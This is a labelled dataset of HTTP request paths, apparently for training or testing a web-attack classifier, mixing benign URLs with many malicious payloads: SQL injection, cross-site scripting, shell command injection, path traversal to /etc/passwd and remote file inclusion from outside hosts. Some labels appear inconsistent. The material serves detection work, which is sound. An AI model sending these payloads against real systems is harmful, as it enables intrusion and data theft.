request	label
/ fartspray1 / 	0
/ javascript / robots . out 	0
/ string / strings / parameters = '  |   [  1 -ne  $  ( echo fnegwh  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  | 	1
"/ rpxyx07v . fts ?  < script > document . cookie =  "" testbnli = 1975 ;  ""  <  / script > "	1
/ readconf / 	0
/ string / modo = registro & login = reiser & password = fi338841 & nombre = palmira & apellidos = rocha + pello & email = terry-lewis . macdougall @ ofertaschinas . gd & dni = b111155b29c & direccion = calle + los + hotelitos + s / n ,  +  & ciudad = alforja & cp = 06200 & provincia = madrid & ntc = 6898289931368660 & b1 = registrar 	1
/ string / strings / parameters = sancarranco cantabella 	0
"/ string / strings / parameters = ""  ;  str =  $  ( echo zwbbrm )  ;  str1 =  $  {  # str }  ;  if  [  8 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  | "	1
/ string / strings / parameters = -2604 )  )  as sekb where 6897 = 6897 or 1000 = 7683 	1
"/ wps / wcm / webinterface / login / login . jsp ?  ""  >  < script > alert (  "" ibm_login_qs_xss . nasl-1331909400 ""  )  <  / script > "	1
/ cns ! 2497bda254e3d56b ! 157 / 	0
/ strong_government / 	0
/ string / strings / parameters = 1 %  '  union all select null # 	1
/ javascript / xxx . sql 	0
/ string / strings / parameters = yoshiyam 	0
/ core / aural . php ? site_absolute_path =  @ rfiurl ? cmd = dir & site_absolute_path =  @ rfiurl ? 	0
"/ string / strings / parameters = -4764 ""  ""  )  )  or 2724 in  (  ( char ( 113 )  + char ( 113 )  + char ( 112 )  + char ( 106 )  + char ( 113 )  +  ( select  ( case when  ( 2724 = 2724 )  then char ( 49 )  else char ( 48 )  end )  )  + char ( 113 )  + char ( 122 )  + char ( 118 )  + char ( 122 )  + char ( 113 )  )  )  and  (  (  ""  "" dfvz ""  ""  like  ""  "" dfvz "	1
/ string / id = 3 & nombre = vino +  .  *  ? rioja & precio = 100 & cantidad = 84 & b1 = aadir + al + carrito 	1
/ newjournalist / 	0
/ string / strings / parameters = 08011 	0
/ linkadmin . php ? page = xxpathxx ? 	1
/ string / strings / parameters = 1 )  )  )  ; select dbms_pipe . receive_message ( chr ( 112 )  |  | chr ( 70 )  |  | chr ( 106 )  |  | chr ( 78 )  , 5 )  from dual -- 	1
/ main . php ? logout =  '  ; uname \ x09 > q79392194 \ x09 # 	1
/ main . php ? stuff =  & del \ x0cq57337183 & rem \ x0c 	0
/ main . php ? logout =  '  & del q65442989  # 	1
/ string / strings / parameters = 43814 	0
"/ fmnveedu . cgi ?  < script > document . cookie =  "" testgfbr = 7014 ;  ""  <  / script > "	1
/ troyrollo / 	0
"/ string / strings / parameters = 1 ""  ""  )  )  or 8466 = benchmark ( 5000000 , md5 ( 0x694a4745 )  )  and  (  (  ""  "" iuxs ""  ""  like  ""  "" iuxs "	1
/ string / strings / parameters = 1 '  )  )  )  and elt ( 1210 = 1210 , sleep ( 5 )  )  and  (  (  (  ' aiuy '  =  ' aiuy 	1
/ 000040390 / 	0
/ examples / jsp / error / ttawebtop . cgi /  ? action = start & pg =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ javascript / ig . asp 	0
/ string / modo = registro & login = gilly & password = f + emenciar & nombre = crisant / o & apellidos = heredia + wald & email = meskill_ferlinghetti @ wormee . pw & dni = 37936735y & direccion = c /  + ginebre ,  + 98 +  & ciudad = manzanillo & cp = 33310 & provincia = segovia & ntc = 1741584206084308 & b1 = registrar 	1
/ cgi-bin / sgdynamo . exe ? htname = sgdynamo . exe 	1
/ string / strings / parameters = ; echo $ ifsckyhaj $  (  ( 39 + 53 )  )  $  ( echo $ ifsckyhaj ) ckyhaj | 	1
/ javascript / press . exe 	1
/ string / modo = entrar & login = estel & pwd = a , n .  ,  , mi2a & remember = on & b1 = entrar 	1
/ c8b0qc71dj946d8hf5w / 	0
"/ string / strings / parameters = 1 %  ""  ""  )  )  rlike  ( select  ( case when  ( 4207 = 1757 )  then 1 else 0x28 end )  )  and  (  (  ""  ""  %  ""  ""  =  ""  "" "	1
/ 0118928 / 	0
/ string / strings / parameters = casiana 	0
/ string / id = 3 & nombre = jamn + ibrico & precio = 39 & cantidad = 15 & b1 = aadir + al + carrito 	0
"/ string / strings / parameters = 1 ""  ""  )  procedure analyse ( extractvalue ( 5840 , concat ( 0x5c , 0x7171706a71 ,  ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end )  )  , 0x717a767a71 )  )  , 1 )  and  (  ""  "" tgdu ""  ""  =  ""  "" tgdu "	1
/ javascript / soaprouter . pdf 	0
/ 247930 / 	0
/ string / strings / parameters = 4016 	0
/ string / strings / parameters = 1 '  )  )  )  and char ( 111 )  |  | char ( 77 )  |  | char ( 121 )  |  | char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null )  and  (  (  (  ' tvar '  =  ' tvar 	1
/ string / strings / parameters = '  + if ( benchmark ( 3000000 , md5 ( 1 )  )  , null , null )  , null , null , null , null , null , null , null , null , null )   -- 	1
/ string / id = 2 & nombre = jamn + ibrico & precio = 100 /  & cantidad = 35 & b1 = aadir + al + carrito 	1
/ string / strings / parameters = 1 '  )  )  and 9254 =  ( select count (  *  )  from rdb $ fields as t1 , rdb $ types as t2 , rdb $ collations as t3 , rdb $ functions as t4 )  -- 	1
/ 29worl34 / 	0
/ scripts / bb_func_txt . php ? pathtofiles =  / etc / passwd \ x00 	1
/ image363 / 	0
/ manager / mapserv . exe ? map = mapserver_detect . nasl . map 	1
/ modules / agendax / addevent . inc . php ? agendax_path = xxpathxx & cmd = id 	1
/ 100323 / 	0
/ roundbox / 	0
/ javascript / interim . swf 	0
/ darkanime / 	0
/ bluewebn / 	0
/ string / strings / parameters = chirona 	0
/ string / strings / parameters = huebing @ biosoftware . pe 	0
/ javascript / axis2-admin . csproj 	0
/ business_tp / 	0
/ administrator / components / com_mosmedia / includes / media . divs . js . php ? mosconfig_absolute_path = http :  /  / 192 . 168 . 202 . 96 : 8080 / vir0v3xfc ? 	0
/ string / strings / parameters = -5300 '  union all select 2750 , 2750 , 2750 , 2750 , 2750 , 2750 -- 	1
"/ string / strings / parameters = 1 ""  ""  )  where 7950 = 7950 and 3580 =  ( select count (  *  )  from domain . domains as t1 , domain . columns as t2 , domain . tables as t3 )  -- "	1
/ javascript / trash . bin 	0
/ javascript / fuck . c 	0
/ string / modo = entrar & login = hy & pwd = ap-remiadora & remember = on & b1 = entrar 	0
/ scripts / month . php 	1
/ clientsmtpvalidation / 	0
/ month . gif 	0
"/ demo / ms-pe02 / catalog . php ? cid = 0 & sid =  '  ""  & sortfield = title & sortorder = asc & pagenumber = 1 & main = http :  /  / 192 . 168 . 202 . 96 : 8080 / 4dckqcc0acprbz ?  & "	1
"/ help . php ? q =  ""  | sleep \ x097 \ x09 # "	1
/ 167373 / 	0
/ string / strings / parameters = 1 where 4968 = 4968 or updatexml ( 1808 , concat ( 0x2e , 0x7171706a71 ,  ( select  ( elt ( 1808 = 1808 , 1 )  )  )  , 0x717a767a71 )  , 8666 )  -- 	1
"/ string / strings / parameters = < a href =  ""  \ x04javascript : javascript : alert ( 1 )  ""  id =  "" fuzzelement1 ""  > test <  / a > "	1
"/ main . php ? stuff =  ""  \ x0duname  > q25775847  # "	1
"/ jdx255ea . jspa ?  < meta http-equiv = set-cookie content =  "" testziyq = 5055 ""  > "	1
/ string / strings / parameters = calle general blake 185 	0
/ javascript / sales . html 	0
/ main . php ? stuff =  '  \ x0auname \ x09 > q47233887 \ x09 # 	1
/ 4-1996 / 	0
/ 0471467901 / 	0
/ string / strings / parameters = 1 '  and char ( 120 )  |  | char ( 106 )  |  | char ( 117 )  |  | char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 )  , 0 )  , 5000000000 )  , null )  and  ' vunt '  =  ' vunt 	1
/ examples / jsp / jsp2 / el / lib / owl_api . php ? xrms_file_root =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
"/ help . php ? q =  "" del \ x09q75241669 & rem \ x09 "	1
/ scripts / forum . php3 ? id_article = 1 & id_forum = -1 /  *  *  / union /  *  *  / select 1164366855 -- 	1
/ javascript / transactions . jsp 	0
/ 186173 / 	0
/ string / strings / parameters = 1 %  '  )  and 4241 = convert ( int ,  ( select char ( 113 )  + char ( 113 )  + char ( 112 )  + char ( 106 )  + char ( 113 )  +  ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end )  )  + char ( 113 )  + char ( 122 )  + char ( 118 )  + char ( 122 )  + char ( 113 )  )  )  and  (  '  %  '  =  ' 	1
/ scripts / calendar . php ? month =  '  union select 1 , 1 ,  ' 1331918956 '  ,  ' calendarix_month_sql_injection . nasl '  , 1  # 	1
"/ string / strings / parameters = 1 ""  ""  )  as jngl where 8384 = 8384 and 4580 = 1718 -- "	1
"/ string / strings / parameters = |  | echo thdzzm $  (  ( 55 + 49 )  )  $  ( echo thdzzm ) thdzzm "" "	1
/ string / id = 1 & nombre = vino + rioja & precio = 85 & cantidad = 17 & b1 = aadir + al + carrito 	0
"/ string / strings / parameters = "" echo $ ifswylahg $  (  ( 98 + 68 )  )  $  ( echo $ ifswylahg ) wylahg \ "	1
/ public-service / 	0
/ reldata / 	0
/ string / strings / parameters = 1 '  )  where 8268 = 8268 union all select null , null , null , null -- 	1
/ string / strings / parameters = descolocado 	0
/ category_113 / 	0
/  < script > alert (  ' vulnerable '  )  <  / script >  . thtml 	1
/ dsa-1244 / 	0
/ softpepper-download / 	0
"/ string / strings / parameters = ""  ; echo $ ifsfjalao $  (  ( 19 + 27 )  )  $  ( echo $ ifsfjalao ) fjalao \ "	1
"/ string / strings / parameters = ""  | echo edeezb $  (  ( 20 + 80 )  )  $  ( echo edeezb ) edeezb "" "	1
/ javascript / wiki . exe 	1
/ about_perl / 	0
/ string / strings / parameters = 1 %  '  )  )  and 2006 = 2006 	1
/ string / strings / parameters = 1 %  '  rlike sleep ( 5 )  # 	1
/ javascript / helpers . tmp 	0
/ cgi . cgi / texis . exe / junk 	1
/ en-us / account / snpfiltered . pl ? t = c & u =  < script > foo <  / script > 	1
/ 103632 / 	0
/ green-ball / 	0
/ javascript / append . rar 	0
/ string / modo = insertar & precio = 3228 & b1 = pasar + por + caja / 	1
/ javascript / crypt . so 	0
"/ string / strings / parameters = ""  + if ( benchmark ( 3000000 , md5 ( 1 )  )  , null , null )  )   /  * "	1
"/ string / strings / parameters = $  { system ( print (  ` echo wjamji `  .  ` echo  $  (  ( 95 + 52 )  )  `  .  ` echo wjamji `  .  ` echo wjamji `  )  ;  .  "" wjamji "	1
"/ string / strings / parameters = < table background =  "" javascript : javascript : alert ( 1 )  ""  > "	1
/ string / strings / parameters = 1 )  as tbve where 4828 = 4828 ; select sleep ( 5 )  # 	1
"/ string / strings / parameters = < div id =  "" 114 ""  >  < x style =  "" background : url (  ' x [ a ]  ; color : red ;  /  *  '  )  ""  > xxx <  / x >  /  /  [  ""  '  `  --  >  ]  ]  >  ]  <  / div > "	1
/ ar2007010501650 / 	0
/ main . php ? stuff =  ; uname  > q92696358  # 	1
/ phish061009a / 	0
"/ string / strings / parameters = ""   str =  $  ( echo synsac )   str1 =  $  {  # str }   if  [  4 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  ' "	1
"/ miz4r5hz . php ?  < script > document . cookie =  "" testviqu = 1270 ;  ""  <  / script > "	1
/ mbsahome / 	0
/ string / strings / parameters = 3313 	0
/ string / str =  $  ( echo gqpjfy )   str1 =  $  {  # str }   if  [  2 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  | 	1
/ cryptography_ra / 	0
/ 180213 / 	0
"/ bxnyrhmh . exe ?  < meta http-equiv = set-cookie content =  "" testmjct = 1867 ""  > "	1
/ cgi-bin / webspirs . cgi ? sp . nextform =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ buildnode_start / 	0
/ 121235 / 	0
/ string / strings / parameters = blomfield @ enlanzarote . com . al 	0
/ string / modo = entrar & login = fax & pwd = r-evu4lo & remember = off & b1 = entrar 	0
/ home_sky / 	0
/ string / modo = insertar & precio = 2161 & b1 = pasar + por + caja 	0
/ javascript / shell . manifest 	0
/ javascript / wysiwyg . shtml 	0
/ javascript / blogs . log 	0
/ help . php ? q =  '  ; rm \ x09q69988199 \ x09 # 	1
/ phpmyadmin / adlayer . php ? layerstyle =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
"/ edv3mapy . aspx ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / strings / parameters = < div style = writing-mode : tb-rl ; overflow : scroll onscroll = alert ( 1 )  > 	1
/ banner_wask / 	0
/ inspectors_home / 	0
/ 60726_wallpaper110 / 	0
/ javascript / _vti_txt . rss 	0
/ google + leadership / 	0
/ de3v2dd9 . php3 ?  < script > cross_site_scripting . nasl <  / script > 	1
/ verbe_v4 / 	0
"/ 0u75ldxq . cfm ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ 4153_01 / 	0
/ check-out / 	0
/ string / strings / parameters = | echo $ ifsfqixot $  (  ( 96 + 55 )  )  $  ( echo $ ifsfqixot ) fqixot & 	1
/ viewer_implementations / 	0
/ javascript / performance . pem 	0
/ string / strings / parameters = 1 %  '  )  ; begin dbms_lock . sleep ( 5 )  ;  end and  (  '  %  '  =  ' 	1
/ axufhcur . exe / 	1
/ main . php ? stuff =  ; del q23784271  # 	1
/ string / strings / parameters = edlund @ cementoscalibra . yu 	0
/ home_p / 	0
"/ top . php ? stuff =  "" ping , -w , 7000 , -n , 1 , 4 . 3 . 2 . 1 | rem , "	1
/ string / strings / parameters = blanc hormachea 	0
/ string / strings / parameters = 1 and substring ( version (  )  , 1 , 1 )  = 4 	1
"/ string / strings / parameters = \  ""  >  <  / style >  <  / script >  < script > alert ( 0x000123 )  <  / script > "	1
/ 20060824-2 / 	0
/ modules / horoscope / footer . php ? xoopsconfig [ root_path ]  = xxpathxx 	1
"/ bzuf9ozq . do ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
"/ awstats / awstats . pl ? migrate =  | echo ;  / bin / echo -en  "" zj \ 0003x \ 0315 \ 0200xp1 \ 0322 \ 0262 \ 0377 \ 0266 \ 0377 \ 0001 \ 0320 ""   >  >   / tmp / wrkvkjjzem0 ; echo | awstats648649 . txt "	1
/ string / modo = registro & login = rickie & password = techumbre & nombre = yazmn & apellidos = aul & email = wilton7 @ weat . ic & dni = 86273903y & direccion = calle + teniente + bragado + 139 + 7 ? e & ciudad = sant + juli + del + llor + i + bonmat & cp = 43426 & provincia = guadalajara & ntc = 3817112988880158 & b1 = registrar 	0
/ 0rufe52p . mscgi ?  < script > cross_site_scripting . nasl <  / script > 	1
/ 0w155a7c . jspa ?  < script > cross_site_scripting . nasl <  / script > 	1
/ part51 / 	0
/ string / id = 2 & nombre = ques + o + manchego & precio = 85 & cantidad = 73 & b1 = aadir + al + carrito 	1
/ string / strings / parameters = =   ' 	1
/ javascript / node . shtml 	0
/ string / strings / parameters = 8970308470180045 	0
/ string / strings / parameters = '  and count (  / comment (  )  )  = 1 and  ' 1 '  =  ' 1 	1
/ 179090 / 	0
/ string / strings / parameters = 1 '  )  )  or 6793 =  ( select 6793 from pg_sleep ( 5 )  )  and  (  (  ' zjun '  =  ' zjun 	1
/ cat_wordpress / 	0
/ retailers_gifts / 	0
/ spellbound / 	0
/ string / strings / parameters = cote suengas 	0
/ string / strings / parameters = evin 	0
/ string / strings / parameters = '  |   [  4 -ne  $  ( echo ygeokn  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1 	1
/ string / strings / parameters = |   [  9 -ne  $  ( echo kbohvq  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  \  \ 	1
/ menu_c1 / 	0
/ prismneo / 	0
/ kashmir - the good life / 	0
/ cacti / adodb-perf-module . inc . php ? last_module = zzz_adoconnection {  } system ( id )  ; class zzz_adoconnection {  }  /  / 	1
/ includes / functions / master . inc . php ? fm_data [ root ]  = http :  /  / cirt . net / rfiinc . txt ?  ? 	0
/ javascript / test . ora 	0
/ examples / jsp / jsp2 / el / news / index . dot ? id =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  / etc / passwd \ x00 . jpg 	1
/ bubbletechpadswristguards / 	0
/ 102386 / 	0
/ b0001xanui / 	0
/ string / strings / parameters = '   str =  $  ( echo roezhe )   str1 =  $  {  # str }   if  [  1 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  | 	1
"/ string / strings / parameters = -9873 ""  ""  union all select 8020 , 8020 , 8020 , 8020 , 8020 , 8020 # "	1
/ avi mpeg wmv joiner_information / 	0
/ javascript / codecs . dump 	0
/ 053005-sim / 	0
/ i-ching insider v2 / 	0
/ mpcgi / vssetcookie . exe 	1
/ javascript / wwwroot . cpp 	0
/ system / _b / contentfiles / gbindex . php ? gbrootpath = xxpathxx ? 	1
/ d765w06j . php3 ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / strings / parameters = c /  ingeniero cajal lasala 31 5 ? f 	0
"/ string / strings / parameters = !  [ a '  ""  ` onerror = prompt ( document . cookie )  ]  ( x )  \ "	1
"/ main . php ? stuff =  ""  & del q33239588  # "	1
/ javascript / soft . rtf 	0
/ string / str =  $  ( echo dmzptc )   str1 =  $  {  # str }   if  [  8 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  | 	1
/ uu_home / 	0
/ elfbowl / 	0
/ dmk_blackops2006 / 	0
/ recordings / top . php ? header =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ jnv890lt . nsf ?  < script > cross_site_scripting . nasl <  / script > 	1
/ path_script / createurl . php ? formurl = http :  /  / 192 . 168 . 202 . 118 : 8080 / tzhfyzkbomspvm ? 	1
/ 006093 / 	0
/ midwest_download / 	0
/ tn_392 / 	0
/ tcpudp-18 / 	0
/ string / strings / parameters = '  ;  str =  $  ( echo hldnyh )  ;  str1 =  $  {  # str }  ;  if  [  4 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  & 	1
/ support-integration / 	0
/ string / strings / parameters = 1 '  in boolean mode )  or 6793 =  ( select 6793 from pg_sleep ( 5 )  )  # 	1
/ javascript / products . tar 	0
/ string / strings / parameters = bisad 	0
/ j734qobz . mscgi ?  < script > cross_site_scripting . nasl <  / script > 	1
"/ string / strings / parameters = -6381 %  ""  ""  or 8571 = 8571 -- "	1
/ string / strings / parameters = 1 '  )  )  and  ( select  *  from  ( select ( sleep ( 5 )  )  ) fzno )  and  (  (  ' tjvy '  like  ' tjvy 	1
"/ odzk29aa . cfc ?  < meta http-equiv = set-cookie content =  "" testtfvh = 2141 ""  > "	1
/ string / strings / parameters = 19432 	0
"/ w4996nr0 . exe ?  < meta http-equiv = set-cookie content =  "" testttvs = 7163 ""  > "	1
/ string / strings / parameters = 1 '  in boolean mode )  and 5981 = 6700 	1
/ socceram 12th february 2005 pts 3-9 / 	0
"/ main . php ? logout =  "" ping \ x0c-w \ x0c10000 \ x0c-n \ x0c1 \ x0c4 . 3 . 2 . 1 | rem \ x0c "	1
/ admin / config_settings . tpl . php ? include_path = xxpathxx ?  & cmd = id 	1
/ 187182 / 	0
/ 21349446 / 	0
/ javascript / htdocs . jpg 	0
/ webmin_information / 	0
/ string / strings / parameters = 2532457145340118 	0
/ ofkh09022005825126m / 	0
/ string / modo = registro & login = etienne & password = ahoga2iz8 & nombre = pastora & apellidos = aleu + alcaide & email = t @  @ sumu @ ra_senghor @ todomodelos . aq & dni = 44544869x & direccion = giuseppe + micael ,  + 174 + 8-h & ciudad = valdefuentes + del + pramo & cp = 06300 & provincia = ciudad + real & ntc = 5699405800944222 & b1 = registrar 	1
"/ lmw4r201 . dll ?  < meta http-equiv = set-cookie content =  "" testwews = 8477 ""  > "	1
/ string / strings / parameters = gravoso 	0
/ oplaw_hdbk / 	0
/ preview . php ? php_script_path = http :  /  / cirt . net / rfiinc . txt ?  ?  & cmd = dir 	1
/ string / modo = insertar & precio = 3796 & b1 = pasar + por + caja / 	1
/ string / strings / parameters = 1 %  '  )  or char ( 75 )  |  | char ( 70 )  |  | char ( 99 )  |  | char ( 83 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null )  -- 	1
/ string / strings / parameters = ;  str =  $  ( echo pgaqqt )  ;  str1 =  $  {  # str }  ;  if  [  4 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  /  / 	1
/ tresor 68k e / 	0
/ tpj_logo / 	0
/ juegos-pc / 	0
/ string / strings / parameters = diego medina 82 5-b 	0
/ string / strings / parameters = 50159319e 	0
/ examples / jsp / colors / core / adodb / server . php ? sql =  ' adodb_sql_sql_injection . nasl 	1
/ string / strings / parameters = 1 '  in boolean mode )  order by 1 -- 	1
/ admin / include / lib . module . php ? mod_root = http :  /  / 192 . 168 . 202 . 96 : 8080 / swgnhpydbq0t ? 	0
/ string / strings / parameters = calle escultor ramon barba ,  153 3-a 	0
/ brianpeiris / 	0
/ 3gnetop866 / 	0
/ string / strings / parameters = 4960204900106795 	0
/ 2004 international religious freedom report / 	0
/ randgps / 	0
/ javascript / priv . ep 	0
/ string / strings / parameters = hormachea vilamasa 	0
/ string / strings / parameters = almfar 	0
/ string / strings / parameters = 457l0m3t46 	0
/ 714547 / 	0
/ 141305 / 	0
/ string / strings / parameters = -4127 %  '  union all select 9558 , 9558 , 9558 # 	1
/ string / strings / parameters = 1 )  )  and updatexml ( 3393 , concat ( 0x2e , 0x7171706a71 ,  ( select  ( elt ( 3393 = 3393 , 1 )  )  )  , 0x717a767a71 )  , 1161 )  and  (  ( 5524 = 5524 	1
/ bankshot_basketball / 	0
"/ help . php ? q =  ""  \ x0ddel q43695626  # "	1
"/ string / a =  \  "" get \  ""  ; "	1
/ string / strings / parameters = 0106099240126772 	0
"/ string / strings / parameters = ;  str =  $  ( echo nmeesi )  ;  str1 =  $  {  # str }  ;  if  [  7 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  "" "	1
"/ vmi8bb12 . php3 ?  < script > document . cookie =  "" testlerc = 2575 ;  ""  <  / script > "	1
/ amateur / 	0
/ string / modo = insertar & precio = 8935 & b1 = pasar + por + caja 	0
/ f2697951 / 	0
/ motorola-h700 / 	0
"/  <  / title >  < script > alert (  "" xss ""  )  <  / script > "	1
"/ string / strings / parameters = -4635 ""  ""  union all select 5087 , 5087 , 5087 , 5087 , 5087 , 5087 , 5087 , 5087 , 5087 , 5087 # "	1
/ examples / jsp / jsp2 / el / phpnews / sendtofriend . php ? mid =  ' 1 ' 	1
"/ string / strings / parameters = ""  ; echo epabxr $  (  ( 84 + 49 )  )  $  ( echo epabxr ) epabxr "	1
/ string / strings / parameters = 1 )  )  as vzgo where 6281 = 6281 and 8514 =  ( select count (  *  )  from domain . domains as t1 , domain . columns as t2 , domain . tables as t3 )  -- 	1
/ string / strings / parameters = pinazo paillalef 	0
"/ string / strings / parameters = 1 %  ""  ""  )  and 5556 =  ( select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 )  and  (  ""  ""  %  ""  ""  =  ""  "" "	1
/ string / strings / parameters = 1 '  +  ( select rhlb where 9477 = 9477 ; if ( 7899 = 7899 )  select 7899 else drop function zbbp -- 	1
/ string / strings / parameters = 05684753g 	0
/ president_hayes / 	0
/ shortie like mine / 	0
/ phpmyadmin / webcart . cgi ? config = mountain & change = yes & nextpage =  ; id |  & code = phold 	1
/ 048477 / 	0
/ cgi-bin / nph-showlogs . pl ? files =  .  .  /  .  .  /  & filter =  .  *  & linecnt = 500 & refresh = 0 & submit = go 	1
/ string / modo = registro & login = brogley & password = 6r5ncer5 & nombre = arturo & apellidos = llompart + maydana & email = rosic @ faders . com . sn & dni = 26562587w & direccion = calle + alhondiga ,  + 103 ,  + 12d & ciudad = condado + de + castilnovo & cp = 49327 & provincia = badajoz & ntc = 7562939151589208 & b1 = registrar 	0
"/ x7pclv4s . jsp ?  < meta http-equiv = set-cookie content =  "" testiulz = 3709 ""  > "	1
"/ string / strings / parameters = 1 ""  ""  where 8635 = 8635 and 4595 = 4595 # "	1
/ cgi-bin / index . php ? p =  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \ boot . ini \ x00 	1
/ string / id = 3 & nombre = vino +  .  *  ? rioja & precio = 39 & cantidad = 24 & b1 = aadir + al + carrito 	1
/ string / strings / parameters = '  |   [  6 -ne  $  ( echo cvucat  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  ' 	1
/ string / modo = entrar & login = wingrove & pwd = 37m1 ' o , r3ea & remember = on & b1 = entrar 	1
"/ string / strings / parameters = 1 %  ""  ""  )  or 7417 =  ( select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 )  -- "	1
/ 57863313 / 	0
/ prepart22 / 	0
/ tot-ssi2004 / 	0
/ cgi-bin / wguest . exe 	1
/ examples / jsp / jsp2 / el / edit . jsp ? page = user & editor =  .  .  /  .  .  /  .  .  / install 	1
/ string / strings / parameters = < style /  >  & lt ;  / style & gt ;  & lt ; img src = 1 onerror = confirm ( 1 )  & gt ;  <  / style > 	1
"/ help . php ? q =  "" ping ; -w ; 9000 ; -n ; 1 ; 1 . 2 . 3 . 4 | rem ; "	1
/ 563208 / 	0
/ lawsuit_402869 / 	0
/ 1168105154504 / 	0
/ string / modo = entrar & login =  ?  + maccon / ai & pwd = h4_bi651a2 & remember = on & b1 = entrar 	1
/ string / strings / parameters = shemwell 	0
/ javascript / bullet . core 	0
/ searchspace / 	0
/ string / strings / parameters = 62si27t8ico 	0
/ string / modo =  ' injected_param & precio = 8977 & b1 = pasar + por + caja 	1
"/ string / strings / parameters = ""  ;  str =  $  ( echo grqqci )  ;  str1 =  $  {  # str }  ;  if  [  1 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  ' "	1
/ 039419 / 	0
/ javascript / php . ws 	0
/ string / strings / parameters = sabinigo 	0
/ string / strings / parameters = 1 '  )  and sleep ( 5 )  and  (  ' njud '  =  ' njud 	1
/ 000092171 / 	0
/ javascript / apr . save 	0
/ nm0166678 / 	0
/ 10003645 / 	0
/ opensiteadmin / scripts / classes / form . php ? path = http :  /  / 192 . 168 . 202 . 96 : 8080 / ipb5ri ?  \ x00 	1
/ 0321496310 / 	0
"/ main . php ? logout =  ""  ; del q56278633  # "	1
/ geoloco / 	0
"/ string / strings / parameters = -6122 ""  ""  )  union all select 6578 , 6578 -- "	1
/ string / strings / parameters = -5587 %  '  )  or elt ( 1032 = 1032 , 3623 )  and  (  '  %  '  =  ' 	1
/ javascript / ee . rtf 	0
/ refreshments_gifts / 	0
/ string / strings / parameters = muiz 	0
/ string / strings / parameters = santasus quirce 	0
/ string / strings / parameters = |   [  1 -ne  $  ( echo oiyjxa  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  & 	1
/ string / strings / parameters = \  ' 	1
